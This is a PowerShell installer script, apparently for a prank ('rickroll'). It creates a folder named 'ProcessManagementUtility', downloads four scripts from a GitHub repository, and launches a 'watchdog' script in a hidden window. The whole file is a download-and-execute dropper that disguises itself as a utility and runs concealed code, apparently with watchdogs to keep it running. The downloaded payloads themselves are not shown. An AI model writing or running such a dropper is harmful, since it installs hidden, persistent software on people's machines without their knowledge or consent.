$installDir = "$HOME\ProcessManagementUtility\"

if (!(Test-Path -Path "$installDir")) {
    New-Item -ItemType Directory -Path "$installDir"
}

#! rickroll.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/rickroll.ps1"
$output = "$installDir\rickroll.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

#! watchdog0.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/watchdog0.ps1"
$output = "$installDir\watchdog0.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

#! watchdog1.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/watchdog1.ps1"
$output = "$installDir\watchdog1.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

#! sound.ps1
$url = "https://raw.githubusercontent.com/JuRxY/lav-projekt/main/prog/sound.ps1"
$output = "$installDir\sound.ps1"
Invoke-WebRequest -Uri $url -OutFile $output


#! handle all started functions
Set-Location -Path "$installDir"
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command & './watchdog1.ps1'"

exit 0